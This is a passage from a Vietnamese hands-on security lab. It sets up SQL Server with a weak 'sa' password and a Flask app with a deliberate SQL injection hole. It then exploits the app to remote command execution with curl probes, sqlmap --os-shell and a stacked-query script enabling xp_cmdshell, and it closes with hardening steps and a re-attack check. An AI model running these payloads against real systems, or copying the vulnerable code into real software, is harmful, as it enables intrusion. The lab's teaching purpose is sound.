III. Phần 1 — Cài SQL Server (cấu hình yếu có chủ ý) 
Trên Target: tải SQL Server 2022 Developer Edition (miễn phí) và SSMS từ trang Microsoft. Chạy bộ cài → New SQL 
Server stand-alone installation. 
Bước 1 — Ba màn hình phải dừng lại 
1. Instance Configuration: chọn Default instance (dùng cổng 1433). 
2. Authentication Mode: chọn Mixed Mode; mật khẩu sa = Password1 (cố tình yếu); bấm Add Current User. 
3. Service Accounts: để mặc định và ghi lại tài khoản của SQL Server Database Engine (Phần 6 dùng lại). 
Bước 2 — Bật TCP/IP, SQL Browser, mở tường lửa 
Mở SQL Server Configuration Manager: 
• Network Configuration → Protocols → bật TCP/IP. 
• Services → SQL Server Browser = Running. 
• Khởi động lại SQL Server (MSSQLSERVER). 
Mở cổng cho lab — PowerShell (Run as administrator) trên Target: 
New-NetFirewallRule -DisplayName "LAB MSSQL" -Direction Inbound -Protocol TCP -LocalPort 1433 -
Action Allow -Profile Any 
New-NetFirewallRule -DisplayName "LAB Browser" -Direction Inbound -Protocol UDP -LocalPort 1434 -
Action Allow -Profile Any 
New-NetFirewallRule -DisplayName "LAB WEB" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action 
Allow -Profile Any 
New-NetFirewallRule -DisplayName "LAB PING" -Direction Inbound -Protocol ICMPv4 -IcmpType 8 -Action 
Allow -Profile Any 
Vì sao cần các rule này 
Tường lửa Windows chặn mọi kết nối vào mặc định. Không mở 1433 thì Kali không thấy SQL Server dù dịch vụ đang 
chạy; không mở ICMP thì lệnh ping cũng không thông. Đây là các rule tạm cho lab, gỡ ở Phần Dọn dẹp.

IV. Phần 2 — Web app dính SQL Injection 
Trên Target: cài Python 3 và Microsoft ODBC Driver 18 for SQL Server (kèm theo SSMS, hoặc tải riêng). Rồi: 
pip install flask pyodbc 
Kiểm tra tên driver ODBC đã cài (dùng đúng tên này trong app.py): 
python -c "import pyodbc; print(pyodbc.drivers())" 
# Kết quả thường có: 'ODBC Driver 18 for SQL Server'  (hoặc 17) 
Tạo file app.py — sửa dòng DRIVER= cho khớp tên ở trên: 
from flask import Flask, request 
import pyodbc 
app = Flask(__name__) 
  
# LỖI CÓ CHỦ Ý: app kết nối bằng 'sa' (sysadmin) 
CONN = ('DRIVER={ODBC Driver 18 for SQL Server};SERVER=localhost;' 
        'DATABASE=shopdb;UID=sa;PWD=Password1;' 
        'TrustServerCertificate=yes;Encrypt=no') 
  
@app.route('/product') 
def product(): 
    pid = request.args.get('id', '1') 
    cn = pyodbc.connect(CONN, autocommit=True) 
    cur = cn.cursor() 
    q = "SELECT id,name,price FROM products WHERE id = " + pid   # LỖI SQLi: ghép chuỗi 
    try: 
        cur.execute(q) 
        rows = cur.fetchall() 
        return '<br>'.join(str(tuple(r)) for r in rows) or 'no rows' 
    except Exception as e: 
        return 'SQL error: ' + str(e) 
  
app.run(host='0.0.0.0', port=5000) 
Chạy: python app.py. Kiểm tra từ Kali: 
curl "http://<TARGET_IP>:5000/product?id=1" 
✓ Kết quả mong đợi 
(1, 'Ban phim', 500000) 
 
Nếu curl báo lỗi kết nối 
SSL Provider / certificate: driver 18 mặc định mã hoá — đã thêm TrustServerCertificate=yes;Encrypt=no để 
khắc phục. 
Connection refused / timeout: kiểm tra app đang chạy, rule LAB WEB đã mở, và Kali ping được <TARGET_IP>. 
Câu hỏi phân tích 
1. Viết lại dòng q = ... cho đúng (tham số hoá). 
2. Vì sao app kết nối bằng sa là yếu tố biến SQLi thành RCE?

VII. Phần 5 — Nhánh B: qua SQL Injection → RCE 
Bối cảnh: không biết mật khẩu sa, chỉ có web app cổng 5000. 
Bước 1 — Xác nhận SQLi 
curl "http://<TARGET_IP>:5000/product?id=1" 
curl "http://<TARGET_IP>:5000/product?id=1%20or%201=1"      # trả nhiều dòng => có SQLi 
curl "http://<TARGET_IP>:5000/product?id=0%20UNION%20SELECT%201,@@version,3" 
✓ Kết quả mong đợi 
# curl tra ve 1 dong, cac ban ghi ngan cach bang <br>: 
(1, 'Ban phim', 500000)<br>(2, 'Chuot', 250000)<br>(3, 'Man hinh', 3000000) 
# 'or 1=1' lam lo moi dong => co SQLi 
Bước 2 — Tự động hoá bằng sqlmap (đường chắc chắn nhất) 
sqlmap -u "http://<TARGET_IP>:5000/product?id=1" --batch --dbms=mssql 
sqlmap -u "http://<TARGET_IP>:5000/product?id=1" --batch --dbms=mssql --os-shell 
  
os-shell> whoami 
✓ Kết quả mong đợi 
[*] the back-end DBMS is Microsoft SQL Server 
[*] going to use xp_cmdshell to execute commands 
os-shell> whoami 
nt service\mssqlserver 
Bước 3 — Thủ công: chạy lệnh mù rồi đọc kết quả qua UNION 
Vì sao phải làm 3 bước 
App chỉ trả về result set đầu tiên (câu SELECT). Khi tiêm stacked query, lệnh xp_cmdshell vẫn chạy nhưng output 
nằm ở result set thứ hai — app không hiện. Đây là RCE mù: (1) bật xp_cmdshell → (2) chạy lệnh và hứng output vào 
một bảng → (3) đọc bảng đó bằng UNION. 
Vì app dùng sa nên mọi câu dưới kế thừa quyền sysadmin. Dùng script requests trên Kali để khỏi mã hoá URL thủ 
công: 
python3 - <<'PY' 
import requests 
B = "http://<TARGET_IP>:5000/product" 
def send(pid): print(requests.get(B, params={'id': pid}).text[:300]); print('---') 
  
# (1) bật xp_cmdshell (mù) 
send("1; EXEC sp_configure 'show advanced options',1;RECONFIGURE;" 
     " EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; --") 
  
# (2) chạy whoami, hứng output vào bảng dbo.o (mù) 
send("1; IF OBJECT_ID('dbo.o') IS NOT NULL DROP TABLE dbo.o;" 
     " CREATE TABLE dbo.o(line NVARCHAR(4000));" 
     " INSERT dbo.o EXEC xp_cmdshell 'whoami'; --") 
  
# (3) đọc output qua UNION -> hiện ở vị trí cột 'name' 
send("0 UNION SELECT 1,(SELECT TOP 1 line FROM dbo.o WHERE line IS NOT NULL),3 --") 
PY

IX. Phần 7 — Phòng thủ, rồi tấn công lại 
Phần trọng tâm. Bịt từng lỗ hổng rồi chạy lại lệnh Phần 4–5 để thấy chúng thất bại. 
1 — Tắt xp_cmdshell 
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; 
EXEC sp_configure 'show advanced options', 0; RECONFIGURE; 
2 — Vô hiệu sa, chuyển Windows Authentication 
ALTER LOGIN sa DISABLE; 
-- SSMS: Server Properties > Security > Windows Authentication mode > khởi động lại dịch vụ 
-- Sau restart: đăng nhập lại SSMS bằng tài khoản Windows (đã thêm ở Add Current User) 
3 — App dùng login quyền tối thiểu + tham số hoá 
CREATE LOGIN shop_ro WITH PASSWORD = '<manh-ngau-nhien>'; 
USE shopdb; CREATE USER shop_ro FOR LOGIN shop_ro; 
ALTER ROLE db_datareader ADD MEMBER shop_ro; 
Sửa app.py: UID=sa → UID=shop_ro; và tham số hoá: 
q = "SELECT id,name,price FROM products WHERE id = ?" 
cur.execute(q, (pid,)) 
4 — Thu hẹp mạng & tài khoản dịch vụ 
Set-Service SQLBrowser -StartupType Disabled; Stop-Service SQLBrowser 
# Dịch vụ SQL Server chạy bằng virtual account, KHÔNG phải Administrator/LocalSystem 
Kiểm chứng — tấn công lại, phải THẤT BẠI 
nxc mssql <TARGET_IP> -u sa -p pw.txt --local-auth              # -> login failed (sa đã tắt) 
sqlmap -u "http://<TARGET_IP>:5000/product?id=1" --dbms=mssql --os-shell   # -> không bật được 
xp_cmdshell 
# Sau khi tham số hoá: sqlmap báo không tìm thấy điểm tiêm 
 
Điều bài lab chứng minh 
Không có bước vá thần kỳ — chỉ là những lựa chọn đúng lẽ ra phải làm lúc cài. Cùng chuỗi tấn công, cấu hình đúng 
thì đứt ngay ở bước [1] hoặc [3].
